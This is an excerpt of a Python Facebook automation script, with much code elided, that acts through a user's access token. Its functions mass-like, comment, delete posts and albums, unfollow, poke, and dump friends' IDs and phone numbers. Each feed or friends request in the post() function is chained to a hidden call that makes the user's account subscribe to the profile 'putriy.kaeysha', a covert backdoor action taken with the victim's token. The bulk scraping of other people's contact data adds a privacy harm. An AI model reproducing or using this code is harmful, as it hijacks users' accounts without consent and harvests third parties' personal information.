...
def baliho():
	try:
		...
		r = requests.get('https://m.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://m.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://m.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://m.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://m.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://m.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://m.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get("https://m.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://m.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
...
def like(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			url = "https://m.facebook.com/{0}/reactions".format(post['id'])
...
def comment(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			url = "https://m.facebook.com/{0}/comments".format(post['id'])
			s = requests.post(url, data = parameters)
...
def remove(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://m.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
			a = json.loads(r.text)
...
def confirm(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://m.facebook.com/me/friends/%s?access_token=%s'%(post['from']['id'] , token))
			a = json.loads(r.text)
...
def unfollow(posts):
	...
	try:
		...
		for post in posts['data']:
			...
			r = requests.post('https://m.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
			a = json.loads(r.text)
...
def poke(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://m.facebook.com/%s/pokes?access_token=%s'%(post['id'].split('_')[0],token))
			a = json.loads(r.text)
...
def albums(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://m.facebook.com/'+post['id']+'?method=delete&access_token='+token)
			a = json.loads(r.text)
...
def dump_id():
	...
	try:
		...
		r = requests.get('https://m.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)
...
def dump_phone():
	...
	try:
		...
		for i in a['data']:
			x = requests.get("https://m.facebook.com/"+i['id']+"?access_token="+token)
			z = json.loads(x.text)
...
def dump_id_id():
	...
	try:
		r = requests.get('https://m.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id,token=token))
		a = json.loads(r.text)
